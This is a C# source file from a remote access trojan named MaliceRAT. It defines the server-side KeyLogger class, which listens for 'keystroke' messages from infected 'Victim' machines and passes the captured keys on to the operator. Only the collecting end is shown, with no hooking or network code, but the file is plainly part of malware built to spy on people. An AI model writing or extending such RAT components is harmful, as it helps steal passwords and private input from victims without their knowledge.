using System;

namespace MaliceRAT.RatServer.Features
{
    public class KeyLogger
    {
        #region Events
        public event Action<Victim, string> OnKeystrokeReceived;
        #endregion

        #region Variables
        private Server server;
        #endregion

        #region Constructor
        public KeyLogger(Server server)
        {
            this.server = server;
            server.MessageReceived += OnMessageReceived;
        }
        #endregion

        #region Methods
        private void OnMessageReceived(Victim victim, dynamic message)
        {
            if (message["type"] == "keystroke")
            {
                string keystroke = message["key"].ToString();
                OnKeystrokeReceived?.Invoke(victim, keystroke);
            }
        }
        #endregion
    }
}